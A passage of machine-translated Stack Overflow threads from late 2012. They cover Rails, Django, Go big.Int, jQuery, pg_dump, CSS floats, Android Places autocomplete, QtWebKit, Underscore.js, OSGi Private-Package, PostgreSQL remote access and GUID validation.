Document.includes(:shares => { :group => :users }).where('users.id' => current_user.id) 
```

生成的 SQL（用于`current_user.id = 1`）：

```
SELECT "documents"."id" AS t0_r0, "documents"."created_at" AS t0_r1,
  "documents"."updated_at" AS t0_r2, "shares"."id" AS t1_r0,
  "shares"."group_id" AS t1_r1, "shares"."document_id" AS t1_r2,
  "shares"."created_at" AS t1_r3, "shares"."updated_at" AS t1_r4,
  "groups"."id" AS t2_r0, "groups"."created_at" AS t2_r1,
  "groups"."updated_at" AS t2_r2, "users"."id" AS t3_r0,
  "users"."created_at" AS t3_r1, "users"."updated_at" AS t3_r2
  FROM "documents"
  LEFT OUTER JOIN "shares" ON "shares"."document_id" = "documents"."id"
  LEFT OUTER JOIN "groups" ON "groups"."id" = "shares"."group_id"
  LEFT OUTER JOIN "memberships" ON "memberships"."group_id" = "groups"."id"
  LEFT OUTER JOIN "users" ON "users"."id" = "memberships"."user_id"
  WHERE "users"."id" = 1 
```

请注意，通过使用[`includes`](http://apidock.com/rails/ActiveRecord/QueryMethods/includes)而不是[`joins`](http://apidock.com/rails/v3.2.8/ActiveRecord/QueryMethods/joins)，仅返回不同的结果（因此无需调用`uniq`结果）。请参阅：[不同的连接 Rails](https://stackoverflow.com/questions/4749695/distinct-join-rails)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T11:12:52.793

关于什么

```
docs = []
current_user.groups.uniq.each do |group|
   docs << group.documents
end
docs 
```

# python - 从日期字段Django按月过滤数据

> ID：13514075
> 
> 赞同：2
> 
> 时间：2012-11-22T13:46:34.557
> 
> 标签：python, mysql, django

我需要编写一个查询来返回月份列表中的所有对象。月份将根据日期字段计算，即（2012-10-21 或 2011-04-14）。当我这样做一个月时，它工作正常 `**Table.objects.filter(ad_date__month=month)**`。假设月份 = 05

但是，当我尝试在几个月的列表中执行此操作时，它不起作用。 `**Table.objects.filter(ad_date__month__in=month_list)**`. 假设 month_list = [11, 03, 01, 10]

我收到此错误：

```
"Join on field 'date' not permitted. Did you misspell 'month' for the lookup type?" 
```

似乎 Django 将其视为连接操作。

请建议，我从过去 2 天开始就陷入了这个问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:22:00.010

您所要求的可以使用[Q objects](https://docs.djangoproject.com/en/dev/topics/db/queries/#complex-lookups-with-q-objects)。

以下推导将为您的`month_list`.

```
(Q(ad_date__month=month) for month in month_list) 
```

现在都在一条线上

```
Table.objects.filter(*(Q(ad_date__month=month) for month in month_list)) 
```

编辑：

您可以使用 reduce 函数将所有这些 Q 对象“或”在一起

```
import operator
q_objects = (Q(ad_date__month=month) for month in month_list)
Table.objects.filter(reduce(operator.or_, q_objects)) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:14:56.450

嗨，我知道这不是很好，但它会起作用。

```
from itertools import chain

result_list = []
for mm in month_list:
    this_query = Table.objects.filter(ad_date__month=mm)
    result_list = chain(result_list, this_query) 
```

# extjs - 谷歌图表（GVisualizationPanel）与 ExtJS 4.1 中断

> ID：13514079
> 
> 赞同：0
> 
> 时间：2012-11-22T13:46:43.753
> 
> 标签：extjs, google-visualization, extjs4.1

我正在尝试将 Google Charts（特别是带注释的时间线）与 Ext JS 4.1 结合使用。我遇到了[本教程](http://code.betancourt.us/ext-google-visualization/)，它解释了如何使用 GVisualizationPanel.js 在 Ext JS 面板中显示 Google 图表。

尽管它与 Ext JS 2.2 或 2.3 完美配合，但它似乎根本不适用于 Ext JS 4.1。你可以看到我在下面的 4.1 版本中得到的输出。

**使用 ExtJS 4.1** [输出输出图像](http://imgur.com/RKT9x)

如您所见，在我的示例中没有绘制使用 Ext JS 4.1 的线条。注释也是乱码。我尝试使用 Ext JS 2.3 运行该示例，它运行良好，但使用 2.3 对我来说不是一个选项。

有没有人成功地将 Google Charts 与 Ext JS 4.1 集成在一起？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T05:42:33.307

没关系。我自己的代码有一些错误。基本上，我已经修补了 GVisualizationPanel.js 代码，以便与错误潜入的 ExtJS 4.1 一起使用。这个错误导致同一（第一）行被多次加载到 DataTable 中。因此，仅在时间线的开头有数据。不管怎么说，多谢拉。

# go - 为什么 Go 中的 big int api 这么奇怪？

> ID：13514082
> 
> 赞同：14
> 
> 时间：2012-11-22T13:46:54.300
> 
> 标签：go, biginteger

我试图了解[big int api](http://golang.org/pkg/math/big/)背后的设计决策。

例如，要添加两个大整数，您必须：

```
a := big.NewInt(10)
b := big.NewInt(20)
c := big.NewInt(0)
d := c.Add(a,b) 
```

其中 d 与最后的 c 相同。初始零无关紧要。

为什么不只是：

```
a := big.NewInt(10)
b := big.NewInt(20)
c := big.Add(a,b) 
```

或者更好：

```
a := big.NewInt(10)
b := big.NewInt(20)
c := a.Add(b) 
```

他们有什么理由选择这样做吗？我发现它有点令人困惑，每当我使用它时都必须查找它。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-22T13:51:20.697

`Add`是一种改变接收器的方法。

所以就这样做

```
c := big.NewInt(0).Add(a,b) 
```

或者

```
var c big.Int
c.Add(a,b) 
```

Add 返回接收者这一事实对于函数链接很有用，但您*不需要*使用返回值。

现在假设我们没有 bigInt 作为接收器 ( `c := big.Add(a,b)`) 或者接收器不会被修改 ( `c := a.Add(b)`)。在这两种情况下，都必须为操作分配一个大 Int 并返回（作为指针）。如果您尚未分配并准备好大的 Int，这将是一种浪费。计算的整数不仅仅是一个简单的一两个词结构，它可以很大。因此，最好允许使用预定义的 var，尤其是当您经常在计算循环中间使用大整数时。

```
c := big.Add(a,b) // wasteful because doesn't allow the use of a preexisting big int

c := a.Add(b) // either modifies a (which would force you to copy it each time if you want to keep it) or is wasteful like the last one 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-08-06T10:07:32.580

我想补充一下 Denys 的回答，如果您考虑替代 api，它可以支持如下链接：

```
x.Add(y).Add(z).Mul(v) 
```

很快的问题是 - 这是否符合正常的操作员顺序？

```
x+y+z*v = x+y+(z*v) 
```

但是第一个链会导致 (x+y+z)*v （在 go 中，但可能不是另一种语言） - 因此需要小心。

这：

```
r = r.AddP(x, y.Add(y, z.Mul(z, v))) 
```

有点丑，我同意，但它确实强制了一个明确的顺序，它也让我们有机会保持操作数不变，没有额外的分配（如 Denys 所述）。例如（注意 r 每次都是接收者）：

```
r = r.Add(x, r.Add(y, r.MulInt(z, v))) 
```

这里只有结果值 (r) 被改变，x,y,z 没有改变 - 要在第一个样式 API 中执行此操作，您每次都需要分配。因此，在这种情况下，您要么改变操作数，要么在 big.Int api 中分配，您可以选择其中任何一个。

顺便说一句，以下将等同于第一个链接......

```
r = r.Mul(r.AddP(x, r.Add(y, z)), v) 
```

这实际上看起来更像 (x+y+z)*v

# javascript - 只处理一次 jQuery 函数

> ID：13514083
> 
> 赞同：0
> 
> 时间：2012-11-22T13:46:55.843
> 
> 标签：javascript, jquery

HTML&PHP

我列出票务信息；

```
 <table>      
  <?php
  while($values = mysql_fetch_array($ticketInfo)){ 
    echo '<tr>';
    echo '<td id="ticketPrice">'. $values['ticket_price'] .'</td>';
    echo '<td id="myBonus">'. $values['bonus']*5 .'</td>';
    echo '<td><input type="checkbox" name="use_bonus" onclick="useMyBonus();"  id="myBonusId" /></td>';
    echo '</tr>';
  }      
  ?>
  </table> 
```

当用户单击复选框时，会处理一个 jquery 脚本来计算使用奖金的折扣并将返回数据写入ticketPrice ID。但是有多个复选框，如果用户单击另一个复选框脚本再次计算，但我不这样做。我怎样才能只处理一次？

我的jQuery代码；

```
 function useMyBonus(){
    myBonus         = parseInt($("#myBonus").text());
    ticketPrice     = parseInt($("#ticketPrice").text());
    checked         = $("#myBonusId").is(':checked');

    if(checked == true){
        $("#ticketPrice").text(ticketPrice-(myBonus/2));

    }else{
        $("#ticketPrice").text(ticketPrice+(myBonus/2));

    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T13:59:29.297

因为您在循环中创建了复选框，所以所有复选框都具有相同`id`的“onclick”功能，因此每当您单击任何该复选框功能时都会被调用，因此将唯一 ID 设置为复选框并设置功能：

```
$('#uniqueId').click(function(){
//do your work here
}); 
```

或在您的循环中将`onclick`函数设置为仅要调用此函数的函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T13:58:45.803

您可以使用复选框中的任何标志来提醒操作尚未执行（如 addClass 或 jQuery.data），并在函数开始时检查该类或数据，如果它已经存在则简单地返回。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T14:07:57.643

这将确保您的复选框是唯一的 -

```
<table>      
<?php
$i=0;
      while($values = mysql_fetch_array($ticketInfo)){ 
        echo '<tr>';
        echo '<td id="ticketPrice">'. $values['ticket_price'] .'</td>';
        echo '<td>'. $values['bonus']*5 .'</td>';
        echo '<td><input type="checkbox" name="use_bonus" value="' .$i++ . "_" . $values['ticket_price']  . '"  /></td>';
        echo '</tr>';
      }      
      ?>
      </table> 
```

这将遍历所有复选框并继续计算

```
 <script type="text/javascript">
    function useMyBonus()
    {
        var myBonus=0;

        checkboxes = document.getElementsByName('use_bonus');

        for(var i in checkboxes)
        {
            if(checkboxes[i].checked)

            {
                          var n=str.split("_");
                          //now your ticket price would be n[1], use n[1] for your bonus calculation 
                        //calculate myBonus         
            }           

        }
    }

    </script> 
```

# postgresql - 使用 Postgresql pg_dump 恢复备份文件

> ID：13514084
> 
> 赞同：3
> 
> 时间：2012-11-22T13:46:56.077
> 
> 标签：postgresql

如何恢复由命令生成的文件：

```
pg_dump -i -h localhost -p 5432 -U user -F c -b  -f bkp_file.backup "alfa" 
```

我尝试使用 psql -U user -d alfa-f bkp_file.backup

但是我有很多关于无效字符的错误。所以我不确定我是否正确地执行了 pg_dump。

错误输出示例：

```
psql:cmdb_21-11-2012.backup:1399: invalid command \3?6IÅñå|J‼▼§↓OTaIEDóP&5¶◄▲Ct±^ºO-²
psql:cmdb_21-11-2012.backup:1400: invalid command \ÖÿYÇ/µèI=ÜdUEàmß¿ê÷E|>I▬ßf♂*»Å?B/÷
IYñAªóS`Wö3ßAÆ?l*ádECIY‼)á¢'ul#`aåAArZæp2_í_ÉY-ëU&>ïIìO·▼$5 
```

实际上，转储的备份文件中有很多这样的字符

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-22T13:49:50.367

您正在转储数据的压缩形式并使用需要未压缩形式的程序恢复它。从 pg_dump 行中删除*-F c或使用*[pg_restore](http://www.postgresql.org/docs/9.1/static/app-pgrestore.html)。

# html - 如何使浮动元素占据其父元素的整个宽度

> ID：13514086
> 
> 赞同：0
> 
> 时间：2012-11-22T13:47:13.963
> 
> 标签：html, css

请看下图。

我有一个 div（边界框），其中包含两个浮动的 div，这两个 div 都向左浮动。如何使第二个浮动 div（红色的）将其宽度扩展到边界框内的所有可用空间。

现在，我正在使用 javascript，但在 CSS 中没有解决方案吗？

编辑：

这是我的 HTML 的结构

```
<div id='container'>
    <div id='side'>
    </div>
    <div id='main'>
    </div>
</div> 
```

我的 CSS 或多或少类似于以下内容

```
#container {
     width: 100%;
     position: relative
     overflow: hidden;
}

#side {
     width: 200px;
}

#main, #side {
     float: left;
} 
```

然后我使用jquery设置#main的宽度

```
$('#main').width($("#container").width() - $("#sideview-sidebar").width()); 
```

请注意，我试图避免使用 JS。

![在此处输入图像描述](../Images/4877d571155fb8268b0578b65376bc95.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T13:58:48.510

漂浮`#left`

```
#left {
  float: left;
  width: 200px; /* eg. */
} 
```

为 设置边距`#main`，不要让它浮动。

```
#main {
  margin-left: 200px;
} 
```

如果您想拥有更多的灵活性，请在 中添加另一个 div `#main`，并设置其填充/边距。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:12:52.397

上面带有百分比的解决方案是最好的。关于您的填充/边距，您也只需将它们设置为百分比。那么可以举个例子：

```
#side
{
   width:12%; padding:0 2%; margin:2%;
}
#main
{
   width:78%; margin-right:2%
} 
```

# android - 如何从谷歌地方检索搜索建议？

> ID：13514096
> 
> 赞同：4
> 
> 时间：2012-11-22T13:47:23.447
> 
> 标签：android, google-maps, search, android-searchmanager

我需要在我在搜索栏中输入时的[建议列表。](http://developer.android.com/guide/topics/search/adding-custom-suggestions.html)`cities/streets/villages`我发现我必须实现[contentProvider](https://stackoverflow.com/questions/11491515/turn-autocompletetextview-into-a-searchview-in-actionbar-instead)并且我做到了。现在，对于我输入的所有内容，我得到相同的结果：

> “搜索结果”

虽然[Google Places](https://stackoverflow.com/questions/5551028/using-google-places-api)应该返回正确的位置列表。有人能帮我吗？我怎样才能使我的搜索工作，因为它在谷歌地图上工作？（我的意思是建议，Geocoder 的东西已经完成了）。非常感谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-22T13:54:23.890

这是我遇到类似问题时使用的代码片段。

这是我的**PlacesAutoCompleteAdapter** .java 文件。

```
package com.inukshk.adapter;

import java.util.ArrayList;

import android.content.Context;
import android.widget.ArrayAdapter;
import android.widget.Filter;
import android.widget.Filterable;

import com.inukshk.CreateInukshk.CreateInukshk;

public class PlacesAutoCompleteAdapter extends ArrayAdapter<String> implements
        Filterable {
    private ArrayList<String> resultList;

    public PlacesAutoCompleteAdapter(Context context, int textViewResourceId) {
        super(context, textViewResourceId);
    }

    @Override
    public int getCount() {
        return resultList.size();
    }

    @Override
    public String getItem(int index) {
        return resultList.get(index);
    }

    @Override
    public Filter getFilter() {
        Filter filter = new Filter() {
            @Override
            protected FilterResults performFiltering(CharSequence constraint) {
                FilterResults filterResults = new FilterResults();
                if (constraint != null) {
                    // Retrieve the autocomplete results.

                    resultList = CreateInukshk.autocomplete(constraint
                            .toString());

                    // Assign the data to the FilterResults
                    filterResults.values = resultList;
                    filterResults.count = resultList.size();
                }
                return filterResults;
            }

            @Override
            protected void publishResults(CharSequence constraint,
                    FilterResults results) {
                if (results != null && results.count > 0) {
                    notifyDataSetChanged();
                } else {
                    notifyDataSetInvalidated();
                }
            }
        };
        return filter;
    }
} 
```

这是您在活动的**OnCreate()**中必须执行的操作。

```
autoCompView = (AutoCompleteTextView) findViewById(R.id.editloc);
        autoCompView.setAdapter(new PlacesAutoCompleteAdapter(this,
                R.layout.list_item)); 
```

这是我在应用程序中使用的静态字符串。

```
private static final String PLACES_API_BASE = "https://maps.googleapis.com/maps/api/place";
    private static final String TYPE_AUTOCOMPLETE = "/autocomplete";
    private static final String OUT_JSON = "/json";     
    private static final String API_KEY = "YOUR API KEY"; 
```

最后是您将在适配器中使用的方法。

```
public static ArrayList<String> autocomplete(String input) {

        ArrayList<String> resultList = null;

        HttpURLConnection conn = null;
        StringBuilder jsonResults = new StringBuilder();
        try {
            StringBuilder sb = new StringBuilder(PLACES_API_BASE
                    + TYPE_AUTOCOMPLETE + OUT_JSON);
            sb.append("?sensor=false&key=" + API_KEY);
            // sb.append("&components=country:uk");
            sb.append("&input=" + URLEncoder.encode(input, "utf8"));

            URL url = new URL(sb.toString());
            conn = (HttpURLConnection) url.openConnection();
            InputStreamReader in = new InputStreamReader(conn.getInputStream());

            // Load the results into a StringBuilder
            int read;
            char[] buff = new char[1024];
            while ((read = in.read(buff)) != -1) {
                jsonResults.append(buff, 0, read);
            }
        } catch (MalformedURLException e) {
            Log.e(TAG, "Error processing Places API URL", e);
            return resultList;
        } catch (IOException e) {
            Log.e(TAG, "Error connecting to Places API", e);
            return resultList;
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }

        try {
            // Create a JSON object hierarchy from the results
            JSONObject jsonObj = new JSONObject(jsonResults.toString());
            JSONArray predsJsonArray = jsonObj.getJSONArray("predictions");

            // Extract the Place descriptions from the results
            resultList = new ArrayList<String>(predsJsonArray.length());
            for (int i = 0; i < predsJsonArray.length(); i++) {
                resultList.add(predsJsonArray.getJSONObject(i).getString(
                        "description"));
            }

        } catch (JSONException e) {
            Log.e(TAG, "Cannot process JSON results", e);
        }

        return resultList;
    } 
```

我猜你已经指定了 list_item.xml 如下。

```
<?xml version="1.0" encoding="utf-8"?>
<TextView xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="wrap_content" android:layout_height="wrap_content" /> 
```

试试看。希望它会帮助你。

# reporting-services - #Error in TextBox inside Rectangle

> ID：13514111
> 
> 赞同：0
> 
> 时间：2012-11-22T13:48:34.833
> 
> 标签：reporting-services

今天我在SSRS的一篇报告中遇到了一个奇怪的问题。在报告中，我有一个矩形，其中有一些文本框。文本框包含静态文本或数据集中的字段。一个显示静态文本的工作正常，但一个来自数据集的值显示“#Error”。

如果我将那个可疑的文本框拉到矩形之外，那么它可以正常工作。

可能是什么问题？

# html - 在一个 CSS 类中组合不同的用户代理属性

> ID：13514117
> 
> 赞同：0
> 
> 时间：2012-11-22T13:48:55.440
> 
> 标签：html, css, google-chrome, internet-explorer-8, cross-browser

当用户在文本框中输入错误时，我想将轮廓颜色放入文本框中。问题是 IE8 不支持该`outline`属性（至少我测试没有成功）所以我`border`改用：

但我想`border`用于 IE8 和`outline`支持它的浏览器。

```
.myclass
{
  border: ; // IE8 should use this
  outline: ; // Browser that support it must ignore the above one and get this.
} 
```

我用 IE8 和 Chrome 进行了测试，这两个属性都在 Chrome 中应用，在 IE8 中只有边框。

例子：

```
.myclass
{
  border: 1px solid red;
  outline:#00FF00 dotted thick;
} 
```

[http://jsfiddle.net/puD97/](http://jsfiddle.net/puD97/)

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T13:54:04.247

谁说 IE8 不支持`outline`属性？

尽管如此，如果您想要 IE 和其他浏览器的不同样式，请使用 IE 特定样式表，使用 IE 特定 cstylesheet 注释

```
<!-- This will be ignored by all browsers but IE -->

<!--[if IE]>
    <link rel="stylesheet" type="text/css" href="ie-only.css" />
<![endif]--> 
```

或针对任何特定的 IE 版本

```
<!--[if IE 8]>
    <link rel="stylesheet" type="text/css" href="ie7.css">
<![endif]--> 
```

或者在你的页面中使用这个

```
<!--[if IE 8]>
    <style>
      /* Styles goes here */
    </style>
<![endif]--> 
```

# c++ - 让 QtWebKit 在 Qt creator 中工作

> ID：13514118
> 
> 赞同：0
> 
> 时间：2012-11-22T13:48:56.843
> 
> 标签：c++, qt, qt-creator, qtwebkit

我已经安装了 Qt SDK，我正在尝试使用他们假定的 QtWebKit 制作一个基本的 Web 浏览器，尽管它不在包含列表中，我不确定如何包含相关的标题/包含来让这个节目上路？

构建错误：“无法打开包含文件：'QtWebKit'：没有这样的文件或目录”。

抱歉，如果这是一个基本问题，但我对 C++ 没有太多经验。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:37:34.760

默认情况下，不包括 webkit。

如果使用 qmake，您应该将此行添加到 .pro 文件中。

```
QT += network webkit 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-08-21T04:14:07.070

对于使用 Qt 5 或最近发布的任何人。这种情况略有改变。

您现在需要添加`webkitwidgets`到您的 .pro 文件中。这是我的样子

```
QT += core gui webkitwidgets 
```

# python - 在 virtualenv 中更改已安装的 Python 模块

> ID：13514119
> 
> 赞同：5
> 
> 时间：2012-11-22T13:49:00.353
> 
> 标签：python, virtualenv

我有一个`pip`使用`virtualenv`. 我想尝试对其代码的一行进行一次更改，并想知道它是否可以通过直接转到源文件并更改该行来工作？

如果没有，最简单的方法是什么？下载源代码，更改它，然后`python setup.py install`在`virtualenv`? 但是那会在里面安装模块`virtualenv`吗？我可以稍后使用它删除它`pip`还是需要手动清理它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T13:51:55.960

只要您要编辑的模块是用纯 Python 编写的，更改 virtualenv 的 site-packages 目录中的源代码就可以了。如果模块是 C 扩展，那么您需要在更改生效之前重新编译模块。

编辑：请注意，如果您在交互式会话中使用模块，则每次进行更改时都需要在会话中重新加载模块（并基于该模块重新实例化任何对象实例）。

# javascript - 使用 Underscore.JS 合并两个集合

> ID：13514121
> 
> 赞同：31
> 
> 时间：2012-11-22T13:49:01.947
> 
> 标签：javascript, underscore.js

假设我有两个集合：

c1 -`[{a:1},{a:2},{a:3}]`

和

c2 -`[{a:1},{a:7},{a:8}]`

将独特物品添加`c2`到`c1`使用中的最快方法是什么`Underscore.JS`？集合中的实数是`2K`for`c1`和`500`for `c2`，该操作经常执行，所以必须是高性能的！

**更新 1** - 我只使用`Underscore.JS`了几天，我找不到将一个集合添加到另一个集合中的方法（我可以过滤`c2`自己） - 这是微不足道的`Underscore.JS`吗？

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2012-11-22T14:38:01.543

以下将：

*   创建一个包含 c1 和 c2 的所有元素的新数组。见[联合](http://underscorejs.org/#union)。
*   从该组合中，创建一个仅包含唯一元素的新数组。请参阅[uniq](http://underscorejs.org/#uniq)。

请注意，这仅在您的所有对象都具有属性时才有效`a`。

```
_.uniq(_.union(c1, c2), false, function(item, key, a){ return item.a; }); 
```

[您可以在此问题](https://stackoverflow.com/questions/9923890/removing-duplicate-objects-with-underscore-for-javascript)中找到其他选项。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2015-01-21T11:22:33.637

尝试：

```
_.uniq(_.union(c1, c2), false, _.property('a')) 
```

详细地：

1.  `_.union(*arrays)`

    > 计算传入数组的并集。

2.  `_.property(key)` *（从 1.6.0 版开始）*

    > 返回一个函数，该函数本身将返回任何传入对象的 key 属性。

3.  `_.uniq(array, [isSorted], [iteratee])`

    > 生成数组的无重复版本，`===`用于测试对象是否相等。如果您事先知道数组已排序，则传递`true`isSorted 将运行更快的算法。如果要基于转换计算唯一项，请传递 iteratee 函数。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-11-26T18:17:15.430

函数的文档`uniq()`提到，如果对列表进行排序，它会运行得更快。使用链式调用也可以提高可读性。所以你可以这样做：

```
_.chain(c1).union(c2).sortBy("a").uniq(true, function(item){ return item.a; }).value(); 
```

或者，如果您更喜欢未链接的版本（短 11 个字符但可读性较差）：

```
_.uniq(_.sortBy(_.union(c1,c2),"a"),true, function(item){ return item.a; }); 
```

的文档和示例`uniq()`没有说明回调函数的工作原理。函数的算法`uniq()`在两个列表中的每个元素上调用此函数。如果此函数的结果相同，则会删除该元素（假设它是重复的）。

`union()`事实上，在数组上调用时可以防止重复。我们也可以使用这个事实：

```
_.map(_.union(_.pluck(c1,"a"),_.pluck(c2,"a")),function (item) {return {a:item};}); 
```

上面的like首先将对象列表转换为简单数组（`pluck()`），然后将它们组合使用`union()`并最终用于`map()`创建对象列表。

参考：[uniq()](http://underscorejs.org/#uniq)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-22T13:56:56.513

由于这两个对象中都有大量属性，并且该算法经常运行，因此最好使用核心 Javascript 而不是任何库：

```
//adds all new properties from the src to dst. If the property already exists, updates the number in dst. dst and src are objects
function extendNumberSet( dst, src ) {
    var allVals = [];
    for ( var i = 0; i < dst.length; i++ ) {
        allVals.push(dst[i].a);
    }
    for ( var i = 0; i < src.length; i++ ) {
        if ( allVals.indexOf( src[i].a ) === -1 ) {
            dst.push( src[i] );
        }
    }
} 
```

这是[一个 JSfiddle 来测试它](http://jsfiddle.net/9hhhY/3/)。

# java - 私有包清单标头有什么作用？

> ID：13514123
> 
> 赞同：14
> 
> 时间：2012-11-22T13:49:06.143
> 
> 标签：java, osgi, bnd

我熟悉`Import-Package`and `Export-Package`，但这对我来说是一个新的。它有什么作用？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-22T14:14:12.187

在 OSGi 容器中运行时，它什么也不做。事实上，它甚至没有在 OSGi 规范中提及（我检查了 R4）。

但是，可以在`.bnd`文件中指定它以供 bnd 在构建时使用。如果是这样，它可用于确定捆绑包中的内容。当 bnd 构建一个包时，它会自动确定哪些类需要进入包中。导出的包中的所有类都包括在内，并且它们（传递地）依赖的所有类也包括在内。这意味着如果一个类似乎没有被使用，那么它将不会包含在包中。但是，您可以使用 Private-Package 指令告诉 bnd 将包的内容包含在捆绑包中，即使它似乎未使用。如果没有指定 Private-Package 指令，那么它将由 bnd 自动生成。

[Private-Package](http://www.aqute.biz/Bnd/Format#private-package)的文档如下：

> **私人套餐**
> 
> 包含的方法与 Export-Package 标头相同，唯一不同的是，这些包没有被导出。此标头将被复制到清单中。如果未通过导出和私有包标头选择包，则导出优先。
> 
> Private-Package= com.*

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-11-23T07:25:03.410

如果您知道什么是*静态链接*，那么您就会了解 Private-Package。否则请继续阅读。

Private-Package 是 bnd 告诉您必须在 jar 中但未导出的包的方式。它**不是**OSGi 标头，而是 bnd '指令'。

该指令定义了必须包含在 JAR 中的类路径（使用通配符）中的包。bnd 的独特之处在于它根据规范填充 JAR，而不是像大多数构建工具那样填充某个目录。原因是除非模块是“设计的”并且仔细考虑它们的布局，否则它们很少能提供模块化的好处。

一般来说，Private-Package 指定包含不应与其他包共享的类的包，即实现类。尽管通常它们来自使用 bnd 的相应项目，但从类路径上的任何其他 JAR 中获取它们是完全可以接受的。

一个用例是带有 utils 的库。将 util 库打包成一个包通常会对依赖关系造成严重破坏，因为 utils 往往依赖于许多不相关的东西；您使用一种微小的方法，突然间您拖入了 30Mb 的依赖项。bnd 本身大量使用这个模型和 aQute.lib* 包，这个库中的包永远不应该被导出。这是捆绑包大小和“下载互联网”之间的权衡。Eclipse 和 Apache Felix 的世界之间的差异是显而易见的。Apache Felix 包通常是独立的，不需要各种支持和实用程序包，而 Eclipse 的包往往需要大量的管道包。我认为这种差异主要是由 Eclipse'

在 C 世界中，他们有一种叫做静态链接的东西。链接程序后，将从库中检索任何未解决的问题并将其添加到目标中。在一定程度上 Private-Package 是同一个想法。实际上有一个标头 Conditional-Package 静态链接指定的包和它们传递依赖的任何东西（只要它们属于模式）。

最后 bnd 显示未在清单中的 Private-Package 标头中导出的扩展包。毕竟，清单应该描述内容......

如果您是作者，则可以使用 -removeheaders: Private-Package 删除标题（或在 Maven 中使用 <_removeheaders>Private-Package

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-11-23T07:15:22.957

事实上 Private-Package 不仅仅是不导出一个包。如果 Private-Package 中指定的包没有在您自己的项目中定义并且没有在 Import-Package 中导入，那么它们会自动内联到您的 jar 中。所以这是一种包含非 OSGi 依赖项的简单方法。尽管内联很容易导致类路径问题，但要小心。

# postgresql - Postgresql 服务器远程连接

> ID：13514128
> 
> 赞同：4
> 
> 时间：2012-11-22T13:49:14.797
> 
> 标签：postgresql, tcp, postgresql-9.1, psycopg2

我正在尝试在 ubuntu 上设置一个 postgresql 9.1 服务器，用于远程访问数据。我已经正确安装了 postgres，服务器进程正在运行，并且我正在尝试对其进行配置，以便我可以从 LAN 之外的其他几台计算机通过 Internet 远程访问服务器。

我已经修改了我的 pg_hba.conf ：

```
host    all     all     0.0.0.0     trust 
```

和 postgresql.conf ：

```
listen_addresses = '*'
port = 5432 
```

我还修改了我的 iptables 以接受端口 5432 上的连接。

当我尝试在 python 上使用 psycopg2 进行连接时：

```
conn=psycopg2.connect('host=XX.XX.XX.XX port=5432 dbname=postgres user=myUser password=mypassword') 
```

我收到以下错误：

```
Traceback (most recent call last):
File "<stdin>", line 1, in <module>
File "/usr/local/lib/python2.7/dist-packages/psycopg2/__init__.py", line 179, in connect
connection_factory=connection_factory, async=async) 
psycopg2.OperationalError: could not connect to server: Connection refused
Is the server running on host "XX.XX.XX.XX" and accepting
TCP/IP connections on port 5432? 
```

我不确定我是否插入了正确的 IP 地址，而且我很好奇我将如何确定在这里使用什么 IP 地址来连接到我的服务器。我使用了运行 postgres 服务器的计算机的公共 IP，但我不确定这是否正确。还是我还缺少其他步骤？我知道这是一种糟糕的安全方式，但目前我只想建立一个连接。另外我的电脑在路由器后面，那么我将如何专门访问我的服务器？

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-22T13:53:56.060

你`pg_hba.conf`不应该使用`trust`！！！ `trust`意味着不需要密码，我认为这不是你想要的。

这是正确的配置

```
host    all             all             0.0.0.0/0               md5 
```

注意`/0`后面`0.0.0.0`。

完整的`pg_hba.conf`应该是这样的：-

```
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            md5
# IPv6 local connections:
host    all             all             ::1/128                 md5
host    all             all             0.0.0.0/0               md5 
```

请注意，这`trust`仅适用于`local`连接。`127.0.0.1`即对于在运行您的 postgresql 服务器的机器上的本地主机 IP 上运行的应用程序。

# c# - 有什么方法可以知道一个 guid 是否看起来像一个带有字符和数字的“普通”guid？

> ID：13514129
> 
> 赞同：-3
> 
> 时间：2012-11-22T13:49:15.270
> 
> 标签：c#, .net, visual-studio-2010, guid

我正在将字符串转换为 guid 以检查字符串是否是有效的 guid，在 c# .net 4.0 中字符串是：

`string guid = "11111111-1111-1111-1111-111111111111";`

这个 guid 对我来说应该是无效的，即使它的字符数和 guid 一样多。有没有办法检查一个 guid 是否看起来像一个具有不同字符和数字的“普通”guid？

所有这些方法都不起作用，因为它们返回的 guid 对我有效。

```
Guid.Parse

Guid.TryParse

Guid.TryParseExact 
```

谢谢！

编辑 ：

为了澄清，我需要检查我的 guid 是否像这些 Guid：dc6a1ad8-4743-4487-a28e-54d31870dfcb

我们可以舍弃“无效”和“有效”这两个词，因为人们似乎对此有点关注。所以我需要确保一个 guid 看起来更像这样：dc6a1ad8-4743-4487-a28e-54d31870dfcb 而不是这个：11111111-1111-1111-1111-111111111111

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T14:01:22.143

如果您只想检查 是否`Guid`有不同的字符，您可以检查它包含的不同字节数：

```
int count = yourGuid.ToByteArray().Distinct().Count(); 
```

